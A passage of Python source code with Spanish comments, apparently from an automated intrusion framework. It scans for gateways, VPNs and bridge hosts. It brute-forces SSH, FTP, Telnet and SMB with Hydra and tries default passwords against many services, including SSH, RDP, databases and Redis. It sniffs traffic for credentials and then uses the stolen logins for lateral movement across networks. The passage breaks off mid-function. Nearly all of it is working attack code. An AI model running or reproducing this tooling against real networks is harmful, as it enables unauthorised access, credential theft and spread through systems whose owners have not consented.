    def _detect_related_networks(self, hosts: List[Dict[str, Any]], services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar redes relacionadas y segmentadas"""
        related_networks = []
        
        try:
            # 1. Detectar gateways y routers adicionales
            print("   🔍 Buscando gateways y routers adicionales...")
            additional_gateways = self._find_additional_gateways(hosts)
            
            # 2. Detectar VLANs y segmentos de red
            print("   🔍 Detectando VLANs y segmentos...")
            network_segments = self._detect_network_segments(hosts, services)
            
            # 3. Detectar equipos con múltiples interfaces
            print("   🔍 Buscando equipos con múltiples interfaces...")
            multi_interface_hosts = self._find_multi_interface_hosts(hosts)
            
            # 4. Detectar túneles y VPNs
            print("   🔍 Detectando túneles y VPNs...")
            tunnels_vpns = self._detect_tunnels_vpns(services)
            
            # 5. Detectar redes accesibles a través de hosts comprometidos
            print("   🔍 Detectando redes accesibles...")
            accessible_networks = self._detect_accessible_networks(hosts, services)
            
            related_networks = {
                'additional_gateways': additional_gateways,
                'network_segments': network_segments,
                'multi_interface_hosts': multi_interface_hosts,
                'tunnels_vpns': tunnels_vpns,
                'accessible_networks': accessible_networks,
                'total_related_networks': len(additional_gateways) + len(network_segments) + len(accessible_networks)
            }
            
            print(f"   ✅ Detectadas {related_networks['total_related_networks']} redes relacionadas")
            
        except Exception as e:
            print(f"   ❌ Error detectando redes relacionadas: {e}")
            related_networks = {
                'additional_gateways': [],
                'network_segments': [],
                'multi_interface_hosts': [],
                'tunnels_vpns': [],
                'accessible_networks': [],
                'total_related_networks': 0
            }
        
        return related_networks
    
    def _find_additional_gateways(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Encontrar gateways y routers adicionales"""
        gateways = []
        
        try:
            # Buscar hosts que respondan en puertos de router
            router_ports = [80, 443, 8080, 8443, 23, 22, 21, 161, 162]
            
            for host in hosts:
                ip = host['ip']
                
                # Escanear puertos de router
                for port in router_ports:
                    if self._is_port_open(ip, port):
                        # Verificar si es un router/gateway
                        if self._is_router_gateway(ip, port):
                            gateways.append({
                                'ip': ip,
                                'port': port,
                                'type': 'router_gateway',
                                'accessible': True,
                                'credentials_tested': False
                            })
                            print(f"     🌐 Gateway encontrado: {ip}:{port}")
            
        except Exception as e:
            print(f"     ❌ Error buscando gateways: {e}")
        
        return gateways
    
    def _detect_network_segments(self, hosts: List[Dict[str, Any]], services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar segmentos de red y VLANs"""
        segments = []
        
        try:
            # Analizar rangos de IP para detectar segmentos
            ip_ranges = {}
            
            for host in hosts:
                ip = host['ip']
                # Extraer red base (primeros 3 octetos)
                network_base = '.'.join(ip.split('.')[:3])
                
                if network_base not in ip_ranges:
                    ip_ranges[network_base] = []
                ip_ranges[network_base].append(host)
            
            # Identificar segmentos con múltiples hosts
            for network_base, hosts_in_segment in ip_ranges.items():
                if len(hosts_in_segment) > 1:
                    segments.append({
                        'network_base': f"{network_base}.0/24",
                        'hosts_count': len(hosts_in_segment),
                        'hosts': [h['ip'] for h in hosts_in_segment],
                        'segment_type': 'subnet',
                        'accessible': True
                    })
                    print(f"     📡 Segmento detectado: {network_base}.0/24 ({len(hosts_in_segment)} hosts)")
            
        except Exception as e:
            print(f"     ❌ Error detectando segmentos: {e}")
        
        return segments
    
    def _find_multi_interface_hosts(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Encontrar hosts con múltiples interfaces de red"""
        multi_interface_hosts = []
        
        try:
            for host in hosts:
                ip = host['ip']
                
                # Buscar interfaces adicionales en rangos comunes
                additional_ips = self._scan_for_additional_interfaces(ip)
                
                if additional_ips:
                    multi_interface_hosts.append({
                        'primary_ip': ip,
                        'additional_interfaces': additional_ips,
                        'total_interfaces': len(additional_ips) + 1,
                        'bridge_potential': True
                    })
                    print(f"     🔗 Host multi-interfaz: {ip} ({len(additional_ips)} interfaces adicionales)")
            
        except Exception as e:
            print(f"     ❌ Error buscando hosts multi-interfaz: {e}")
        
        return multi_interface_hosts
    
    def _detect_tunnels_vpns(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar túneles y VPNs"""
        tunnels_vpns = []
        
        try:
            # Buscar servicios VPN comunes
            vpn_ports = [1194, 1723, 500, 4500, 443, 993, 995]
            vpn_services = ['openvpn', 'pptp', 'ipsec', 'l2tp', 'sstp']
            
            for service in services:
                port = service.get('port')
                service_name = service.get('service', '').lower()
                
                if port in vpn_ports or any(vpn in service_name for vpn in vpn_services):
                    tunnels_vpns.append({
                        'host': service['host'],
                        'port': port,
                        'service': service_name,
                        'type': 'vpn_tunnel',
                        'accessible': True
                    })
                    print(f"     🔒 VPN/Túnel detectado: {service['host']}:{port} ({service_name})")
            
        except Exception as e:
            print(f"     ❌ Error detectando túneles/VPNs: {e}")
        
        return tunnels_vpns
    
    def _detect_accessible_networks(self, hosts: List[Dict[str, Any]], services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar redes accesibles a través de hosts comprometidos"""
        accessible_networks = []
        
        try:
            # Buscar hosts que puedan ser puentes a otras redes
            for host in hosts:
                ip = host['ip']
                
                # Buscar rutas y tablas de enrutamiento
                routes = self._get_host_routes(ip)
                if routes:
                    accessible_networks.append({
                        'bridge_host': ip,
                        'accessible_routes': routes,
                        'network_access': True
                    })
                    print(f"     🌉 Host puente: {ip} (acceso a {len(routes)} redes)")
            
        except Exception as e:
            print(f"     ❌ Error detectando redes accesibles: {e}")
        
        return accessible_networks
    
    def _is_port_open(self, ip: str, port: int) -> bool:
        """Verificar si un puerto está abierto"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _is_router_gateway(self, ip: str, port: int) -> bool:
        """Verificar si un host es un router/gateway"""
        try:
            import urllib.request
            
            # Intentar acceder a interfaces web de router
            urls = [
                f"http://{ip}:{port}/",
                f"https://{ip}:{port}/",
                f"http://{ip}:{port}/login.html",
                f"http://{ip}:{port}/index.html"
            ]
            
            for url in urls:
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0')
                    with urllib.request.urlopen(req, timeout=3) as response:
                        if response.status == 200:
                            content = response.read().decode('utf-8', errors='ignore').lower()
                            # Buscar indicadores de router
                            router_indicators = ['router', 'gateway', 'admin', 'login', 'cisco', 'netgear', 'linksys', 'tp-link', 'asus']
                            if any(indicator in content for indicator in router_indicators):
                                return True
                except Exception:
                    continue
            
            return False
            
        except Exception:
            return False
    
    def _scan_for_additional_interfaces(self, ip: str) -> List[str]:
        """Escanear interfaces adicionales de un host"""
        additional_ips = []
        
        try:
            # Buscar en rangos comunes de interfaces adicionales
            base_ip = '.'.join(ip.split('.')[:3])
            
            # Rangos comunes para interfaces adicionales
            common_ranges = [
                f"{base_ip}.1",  # Gateway
                f"{base_ip}.254",  # Gateway alternativo
                f"{base_ip}.2",   # Segunda interfaz
                f"{base_ip}.3",   # Tercera interfaz
            ]
            
            for test_ip in common_ranges:
                if test_ip != ip and self._is_port_open(test_ip, 22):  # SSH
                    additional_ips.append(test_ip)
            
        except Exception as e:
            print(f"     ❌ Error escaneando interfaces adicionales: {e}")
        
        return additional_ips
    
    def _get_host_routes(self, ip: str) -> List[str]:
        """Obtener rutas reales de un host"""
        routes = []
        
        try:
            import sys
            import os
            sys.path.append(os.path.join(os.path.dirname(__file__), 'tools'))
            from network_analyzer import NetworkAnalyzer
            
            # Crear analizador de red
            analyzer = NetworkAnalyzer()
            
            # Obtener topología de red local
            topology = analyzer.get_network_topology()
            
            # Añadir rutas de la topología local
            for route in topology.get('routes', []):
                if route.get('destination'):
                    routes.append(route['destination'])
            
            # Intentar obtener rutas del host específico si tenemos acceso SSH
            if self._is_port_open(ip, 22):
                ssh_routes = self._get_ssh_routes(ip)
                routes.extend(ssh_routes)
            
            # Añadir rutas comunes basadas en la IP
            base_ip = '.'.join(ip.split('.')[:3])
            common_routes = [
                f"{base_ip}.0/24",
                "10.0.0.0/8",
                "172.16.0.0/12",
                "192.168.0.0/16"
            ]
            
            # Añadir rutas comunes que no estén ya en la lista
            for route in common_routes:
                if route not in routes:
                    routes.append(route)
            
        except Exception as e:
            print(f"     ❌ Error obteniendo rutas: {e}")
        
        return routes
    
    def _get_ssh_routes(self, ip: str) -> List[str]:
        """Obtiene rutas via SSH del host"""
        routes = []
        
        try:
            import paramiko
            
            # Credenciales comunes para probar
            common_creds = [
                ('admin', 'admin'),
                ('root', 'root'),
                ('admin', 'password'),
                ('root', 'password'),
                ('admin', '123456'),
                ('root', '123456')
            ]
            
            for username, password in common_creds:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh.connect(
                        hostname=ip,
                        username=username,
                        password=password,
                        timeout=10
                    )
                    
                    # Ejecutar comando para obtener rutas
                    stdin, stdout, stderr = ssh.exec_command('ip route show 2>/dev/null || route -n 2>/dev/null || netstat -rn 2>/dev/null')
                    
                    output = stdout.read().decode('utf-8')
                    ssh.close()
                    
                    # Parsear rutas
                    for line in output.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('Kernel') and not line.startswith('Destination'):
                            parts = line.split()
                            if len(parts) >= 1:
                                destination = parts[0]
                                if destination != 'default' and '/' in destination:
                                    routes.append(destination)
                    
                    break  # Si encontramos credenciales válidas, salir
                    
                except:
                    continue
                    
        except ImportError:
            self.logger.warning("paramiko no disponible para obtener rutas SSH")
        except Exception as e:
            self.logger.debug(f"Error obteniendo rutas SSH: {e}")
        
        return routes
    
    def _detect_technologies(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar tecnologías en los servicios"""
        technologies = []
        
        for service in services:
            if service['service'] != 'unknown':
                tech_info = {
                    'host': service['host'],
                    'port': service['port'],
                    'technology': service['service'],
                    'version': service['version'],
                    'confidence': 'high' if service['version'] != 'unknown' else 'medium'
                }
                technologies.append(tech_info)
        
        return technologies
    
    def _map_network_topology(self, hosts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Mapear topología de red"""
        topology = {
            'total_hosts': len(hosts),
            'hosts_by_type': {},
            'network_segments': [],
            'gateway': None
        }
        
        # Clasificar hosts por tipo
        for host in hosts:
            ip = host['ip']
            last_octet = int(ip.split('.')[-1])
            
            if last_octet == 1:
                topology['gateway'] = ip
            elif last_octet < 10:
                host_type = 'infrastructure'
            elif last_octet < 100:
                host_type = 'servers'
            else:
                host_type = 'clients'
            
            if host_type not in topology['hosts_by_type']:
                topology['hosts_by_type'][host_type] = []
            topology['hosts_by_type'][host_type].append(ip)
        
        return topology
    
    def phase_2_credentials(self):
        """Fase 2: Recolección de credenciales"""
        print("\n🔐 FASE 2: RECOLECCIÓN DE CREDENCIALES")
        print("=" * 50)
        
        self.report['phase_2_credentials']['status'] = 'running'
        
        try:
            # 1. Ataques de fuerza bruta
            print("💥 Ejecutando ataques de fuerza bruta...")
            brute_force_results = self._brute_force_attacks()
            self.report['phase_2_credentials']['credentials_found'].extend(brute_force_results)
            
            # 2. Credenciales por defecto
            print("🔑 Probando credenciales por defecto...")
            default_creds = self._test_default_credentials()
            self.report['phase_2_credentials']['credentials_found'].extend(default_creds)
            
            # 3. Sniffing de tráfico
            print("👂 Sniffing de tráfico de red...")
            sniffed_creds = self._sniff_credentials()
            self.report['phase_2_credentials']['credentials_found'].extend(sniffed_creds)
            
            self.report['phase_2_credentials']['status'] = 'completed'
            print(f"✅ Recolección completada: {len(self.report['phase_2_credentials']['credentials_found'])} credenciales")
            
        except Exception as e:
            self.report['phase_2_credentials']['status'] = 'error'
            self.report['phase_2_credentials']['errors'].append(str(e))
            print(f"❌ Error en recolección: {e}")
    
    def _brute_force_attacks(self) -> List[Dict[str, Any]]:
        """Ejecutar ataques de fuerza bruta"""
        credentials = []
        services = self.report['phase_1_reconnaissance']['services_found']
        
        for service in services:
            if service['service'] in ['ssh', 'ftp', 'telnet', 'smb']:
                print(f"💥 Fuerza bruta en {service['host']}:{service['port']} ({service['service']})")
                
                # Ejecutar ataque de fuerza bruta real
                brute_result = self._real_brute_force(service)
                if brute_result:
                    cred = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'username': brute_result['username'],
                        'password': brute_result['password'],
                        'method': 'brute_force',
                        'timestamp': time.time()
                    }
                    credentials.append(cred)
                    print(f"✅ Credenciales encontradas: {brute_result['username']}:{brute_result['password']}")
        
        return credentials
    
    def _real_brute_force(self, service: Dict[str, Any]) -> Optional[Dict[str, str]]:
        """Ejecutar ataque de fuerza bruta real con Hydra"""
        try:
            # Crear archivo temporal con usuarios
            users_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            for user in self.config['default_users']:
                users_file.write(f"{user}\n")
            users_file.close()
            
            # Crear archivo temporal con contraseñas
            passwords_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            for password in self.config['default_passwords']:
                passwords_file.write(f"{password}\n")
            passwords_file.close()
            
            # Determinar protocolo para Hydra
            protocol_map = {
                'ssh': 'ssh',
                'ftp': 'ftp',
                'telnet': 'telnet',
                'smb': 'smb',
                'http': 'http-get',
                'https': 'https-get'
            }
            
            protocol = protocol_map.get(service['service'], service['service'])
            
            # Comando Hydra
            hydra_cmd = [
                'hydra',
                '-L', users_file.name,
                '-P', passwords_file.name,
                '-t', '4',  # 4 threads
                '-f',  # Stop on first success
                '-o', '-',  # Output to stdout
                f"{service['host']}://{protocol}"
            ]
            
            if service['port'] not in [22, 21, 23, 80, 443, 445]:
                hydra_cmd.extend(['-s', str(service['port'])])
            
            print(f"🔍 Ejecutando Hydra: {' '.join(hydra_cmd)}")
            
            # Ejecutar Hydra
            result = self._run_command(hydra_cmd, timeout=300)  # 5 minutos timeout
            
            # Limpiar archivos temporales
            os.unlink(users_file.name)
            os.unlink(passwords_file.name)
            
            if result['success'] and result['stdout']:
                # Parsear salida de Hydra
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        # Extraer credenciales
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[1].replace('login:', '')
                            password = parts[3].replace('password:', '')
                            return {
                                'username': username,
                                'password': password
                            }
            
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta real: {e}")
            return None
    
    def _test_default_credentials(self) -> List[Dict[str, Any]]:
        """Probar credenciales por defecto"""
        credentials = []
        services = self.report['phase_1_reconnaissance']['services_found']
        
        for service in services:
            for user in self.config['default_users']:
                for password in self.config['default_passwords']:
                    if self._test_credential(service, user, password):
                        cred = {
                            'host': service['host'],
                            'port': service['port'],
                            'service': service['service'],
                            'username': user,
                            'password': password,
                            'method': 'default_credentials',
                            'timestamp': time.time()
                        }
                        credentials.append(cred)
                        break
        
        return credentials
    
    def _test_credential(self, service: Dict[str, Any], username: str, password: str) -> bool:
        """Probar una credencial específica con métodos reales"""
        try:
            host = service['host']
            port = service['port']
            service_type = service.get('service', '').lower()
            
            if service_type == 'ssh':
                return self._test_ssh_credential(host, port, username, password)
            elif service_type == 'rdp':
                return self._test_rdp_credential(host, port, username, password)
            elif service_type == 'smb':
                return self._test_smb_credential(host, port, username, password)
            elif service_type == 'ftp':
                return self._test_ftp_credential(host, port, username, password)
            elif service_type == 'telnet':
                return self._test_telnet_credential(host, port, username, password)
            elif service_type == 'http' or service_type == 'https':
                return self._test_http_credential(host, port, username, password, service_type)
            elif service_type == 'mysql':
                return self._test_mysql_credential(host, port, username, password)
            elif service_type == 'postgresql':
                return self._test_postgresql_credential(host, port, username, password)
            elif service_type == 'mongodb':
                return self._test_mongodb_credential(host, port, username, password)
            elif service_type == 'redis':
                return self._test_redis_credential(host, port, username, password)
            else:
                # Para servicios no específicos, intentar conexión básica
                return self._test_generic_credential(host, port, username, password)
                
        except Exception as e:
            print(f"⚠️ Error probando credencial {username}:{password} en {service['host']}:{service['port']} - {e}")
            return False
    
    def _test_ssh_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial SSH con paramiko"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            
            ssh.close()
            return True
            
        except Exception:
            return False
    
    def _test_rdp_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial RDP con freerdp"""
        try:
            cmd = [
                'xfreerdp',
                f'/v:{host}:{port}',
                f'/u:{username}',
                f'/p:{password}',
                '/cert:ignore',
                '/timeout:5'
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _test_smb_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial SMB con smbclient"""
        try:
            cmd = [
                'smbclient',
                f'//{host}/IPC$',
                f'-U {username}%{password}',
                '-c quit'
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _test_ftp_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial FTP"""
        try:
            import ftplib
            
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=10)
            ftp.login(username, password)
            ftp.quit()
            return True
            
        except Exception:
            return False
    
    def _test_telnet_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial Telnet"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(host, port, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            
            # Leer respuesta para verificar si el login fue exitoso
            response = tn.read_some()
            tn.close()
            
            # Verificar si hay indicadores de login exitoso
            success_indicators = [b'$', b'#', b'>', b'Welcome', b'Last login']
            return any(indicator in response for indicator in success_indicators)
            
        except Exception:
            return False
    
    def _test_http_credential(self, host: str, port: int, username: str, password: str, protocol: str) -> bool:
        """Probar credencial HTTP/HTTPS"""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            
            url = f"{protocol}://{host}:{port}"
            
            # Probar autenticación básica
            response = requests.get(
                url,
                auth=HTTPBasicAuth(username, password),
                timeout=10,
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    def _test_mysql_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial MySQL"""
        try:
            import pymysql
            
            connection = pymysql.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=10
            )
            
            connection.close()
            return True
            
        except Exception:
            return False
    
    def _test_postgresql_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial PostgreSQL"""
        try:
            import psycopg2
            
            connection = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=10
            )
            
            connection.close()
            return True
            
        except Exception:
            return False
    
    def _test_mongodb_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial MongoDB"""
        try:
            import pymongo
            
            client = pymongo.MongoClient(
                f"mongodb://{username}:{password}@{host}:{port}/",
                serverSelectionTimeoutMS=10000
            )
            
            # Probar conexión
            client.server_info()
            client.close()
            return True
            
        except Exception:
            return False
    
    def _test_redis_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial Redis"""
        try:
            import redis
            
            r = redis.Redis(
                host=host,
                port=port,
                password=password,
                socket_timeout=10
            )
            
            # Probar conexión
            r.ping()
            return True
            
        except Exception:
            return False
    
    def _test_generic_credential(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar credencial genérica con socket"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
            
        except Exception:
            return False
    
    def _sniff_credentials(self) -> List[Dict[str, Any]]:
        """Sniffing real de credenciales en tráfico"""
        credentials = []
        
        try:
            import sys
            import os
            sys.path.append(os.path.join(os.path.dirname(__file__), 'tools'))
            from credential_sniffer import CredentialSniffer
            
            # Crear sniffer
            sniffer = CredentialSniffer()
            
            # Obtener interfaces disponibles
            interfaces = sniffer.get_network_interfaces()
            if not interfaces:
                self.logger.warning("No se encontraron interfaces de red para sniffing")
                return credentials
            
            # Usar la primera interfaz disponible
            interface = interfaces[0]
            sniffer.interface = interface
            
            print(f"   🔍 Iniciando sniffing en interfaz {interface}...")
            
            # Iniciar sniffing por 60 segundos
            sniffed_credentials = sniffer.start_sniffing(duration=60)
            
            # Convertir formato
            for cred in sniffed_credentials:
                credentials.append({
                    'host': cred.get('dst_ip', 'unknown'),
                    'port': cred.get('dst_port', 0),
                    'service': cred.get('protocol', 'unknown'),
                    'username': cred.get('username', ''),
                    'password': cred.get('password', ''),
                    'method': 'sniffing',
                    'timestamp': cred.get('timestamp', time.time()),
                    'src_ip': cred.get('src_ip', ''),
                    'raw_data': cred
                })
            
            if credentials:
                print(f"   ✅ {len(credentials)} credenciales capturadas via sniffing")
            else:
                print("   ⚠️ No se capturaron credenciales via sniffing")
                
        except ImportError:
            self.logger.warning("CredentialSniffer no disponible, saltando sniffing")
        except Exception as e:
            self.logger.error(f"Error en sniffing de credenciales: {e}")
        
        return credentials
    
    def phase_3_lateral_movement(self):
        """Fase 3: Movimiento lateral"""
        print("\n🚀 FASE 3: MOVIMIENTO LATERAL")
        print("=" * 50)
        
        self.report['phase_3_lateral_movement']['status'] = 'running'
        
        try:
            credentials = self.report['phase_2_credentials']['credentials_found']
            
            # 1. Explotar credenciales encontradas
            print("🔓 Explotando credenciales encontradas...")
            compromised = self._exploit_credentials(credentials)
            self.report['phase_3_lateral_movement']['compromised_systems'] = compromised
            
            # 2. Establecer conexiones laterales
            print("🔗 Estableciendo conexiones laterales...")
            lateral_conns = self._establish_lateral_connections(compromised)
            self.report['phase_3_lateral_movement']['lateral_connections'] = lateral_conns
            
            # 3. Movimiento lateral entre redes relacionadas
            print("🌐 Realizando movimiento lateral entre redes relacionadas...")
            cross_network_movement = self._cross_network_lateral_movement(compromised)
            self.report['phase_3_lateral_movement']['cross_network_movement'] = cross_network_movement
            
            self.report['phase_3_lateral_movement']['status'] = 'completed'
            print(f"✅ Movimiento lateral completado: {len(compromised)} sistemas comprometidos")
            
        except Exception as e:
            self.report['phase_3_lateral_movement']['status'] = 'error'
            self.report['phase_3_lateral_movement']['errors'].append(str(e))
            print(f"❌ Error en movimiento lateral: {e}")
    
    def _exploit_credentials(self, credentials: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Explotar credenciales encontradas"""
        compromised = []
        
        for cred in credentials:
            print(f"🔓 Explotando {cred['host']} con {cred['username']}:{cred['password']}")
            
            # Ejecutar explotación real
            if self._real_exploitation(cred):
                comp_system = {
                    'host': cred['host'],
                    'port': cred['port'],
                    'service': cred['service'],
                    'username': cred['username'],
                    'password': cred['password'],
                    'access_level': 'user',
                    'timestamp': time.time()
                }
                compromised.append(comp_system)
        
        return compromised
    
    def _real_exploitation(self, cred: Dict[str, Any]) -> bool:
        """Ejecutar explotación real de credencial"""
        try:
            if cred['service'] == 'ssh':
                return self._test_ssh_connection(cred)
            elif cred['service'] == 'ftp':
                return self._test_ftp_connection(cred)
            elif cred['service'] == 'smb':
                return self._test_smb_connection(cred)
            elif cred['service'] in ['http', 'https']:
                return self._test_http_connection(cred)
            else:
                return self._test_generic_connection(cred)
        except Exception as e:
            print(f"❌ Error en explotación real: {e}")
            return False
    
    def _test_ssh_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión SSH real"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                cred['host'],
                port=cred['port'],
                username=cred['username'],
                password=cred['password'],
                timeout=10
            )
            
            # Ejecutar comando simple para verificar
            stdin, stdout, stderr = ssh.exec_command('whoami')
            result = stdout.read().decode().strip()
            
            ssh.close()
            
            if result:
                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']} -> {result}")
                return True
            
        except ImportError:
            print("⚠️ Paramiko no disponible, usando ssh command")
            # Fallback a comando ssh
            ssh_cmd = [
                'ssh',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=10',
                f"{cred['username']}@{cred['host']}",
                'whoami'
            ]
            
            result = self._run_command(ssh_cmd, timeout=15)
            if result['success']:
                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ SSH falló: {e}")
        
        return False
    
    def _test_ftp_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión FTP real"""
        try:
            from ftplib import FTP
            
            ftp = FTP()
            ftp.connect(cred['host'], cred['port'], timeout=10)
            ftp.login(cred['username'], cred['password'])
            
            # Listar directorio para verificar
            files = ftp.nlst()
            ftp.quit()
            
            print(f"✅ FTP exitoso: {cred['username']}@{cred['host']} -> {len(files)} archivos")
            return True
            
        except ImportError:
            print("⚠️ ftplib no disponible, usando ftp command")
            # Fallback a comando ftp
            ftp_script = f"""
open {cred['host']} {cred['port']}
user {cred['username']} {cred['password']}
ls
quit
"""
            
            result = self._run_command(['ftp', '-n'], input=ftp_script, timeout=15)
            if result['success'] and '230' in result['stdout']:
                print(f"✅ FTP exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ FTP falló: {e}")
        
        return False
    
    def _test_smb_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión SMB real"""
        try:
            # Usar smbclient para probar conexión
            smb_cmd = [
                'smbclient',
                f"//{cred['host']}/IPC$",
                '-U', f"{cred['username']}%{cred['password']}",
                '-c', 'ls'
            ]
            
            result = self._run_command(smb_cmd, timeout=15)
            if result['success']:
                print(f"✅ SMB exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ SMB falló: {e}")
        
        return False
    
    def _test_http_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión HTTP real"""
        try:
            import urllib.request
            import urllib.parse
            import base64
            
            # Crear autenticación básica
            auth_string = f"{cred['username']}:{cred['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Determinar protocolo
            protocol = 'https' if cred['service'] == 'https' else 'http'
            url = f"{protocol}://{cred['host']}:{cred['port']}/"
            
            # Crear request con autenticación
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            
            # Realizar request
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"✅ HTTP exitoso: {cred['username']}@{cred['host']}")
                    return True
        except Exception as e:
            print(f"❌ HTTP falló: {e}")
        
        return False
    
    def _test_generic_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión genérica con telnet"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(cred['host'], cred['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(cred['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(cred['password'].encode('ascii') + b"\n")
            
            # Leer respuesta
            response = tn.read_some().decode('ascii', errors='ignore')
            tn.close()
            
            if '$ ' in response or '> ' in response or '# ' in response:
                print(f"✅ Conexión genérica exitosa: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ Conexión genérica falló: {e}")
        
        return False
    
    def _establish_lateral_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones laterales"""
        connections = []
        
        for system in compromised:
            conn = {
                'from_host': system['host'],
                'to_hosts': [],
                'connection_type': 'ssh',
                'established': True,
                'timestamp': time.time()
            }
            
            # Simular conexiones a otros hosts
            for other_system in compromised:
                if other_system['host'] != system['host']:
                    conn['to_hosts'].append(other_system['host'])
            
            connections.append(conn)
        
        return connections
    
    def _cross_network_lateral_movement(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Realizar movimiento lateral entre redes relacionadas"""
        cross_network_results = []
        
        try:
            # Obtener redes relacionadas del reconocimiento
            related_networks = self.report['phase_1_reconnaissance'].get('related_networks', {})
            
            # 1. Explotar gateways adicionales
            additional_gateways = related_networks.get('additional_gateways', [])
            for gateway in additional_gateways:
                if not gateway.get('credentials_tested', False):
                    gateway_access = self._exploit_additional_gateway(gateway)
                    if gateway_access:
                        cross_network_results.append(gateway_access)
                        gateway['credentials_tested'] = True
            
            # 2. Explotar hosts multi-interfaz como puentes
            multi_interface_hosts = related_networks.get('multi_interface_hosts', [])
            for host in multi_interface_hosts:
                bridge_access = self._exploit_multi_interface_host(host, compromised_systems)
                if bridge_access:
                    cross_network_results.append(bridge_access)
            
            # 3. Explotar túneles y VPNs
            tunnels_vpns = related_networks.get('tunnels_vpns', [])
            for tunnel in tunnels_vpns:
                tunnel_access = self._exploit_tunnel_vpn(tunnel)
                if tunnel_access:
                    cross_network_results.append(tunnel_access)
            
            # 4. Explotar redes accesibles
            accessible_networks = related_networks.get('accessible_networks', [])
            for network in accessible_networks:
                network_access = self._exploit_accessible_network(network, compromised_systems)
                if network_access:
                    cross_network_results.append(network_access)
            
            print(f"   ✅ Movimiento lateral entre redes: {len(cross_network_results)} accesos adicionales")
            
        except Exception as e:
            print(f"   ❌ Error en movimiento lateral entre redes: {e}")
        
        return cross_network_results
    
    def _exploit_additional_gateway(self, gateway: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Explotar gateway adicional encontrado"""
        try:
            ip = gateway['ip']
            port = gateway['port']
            
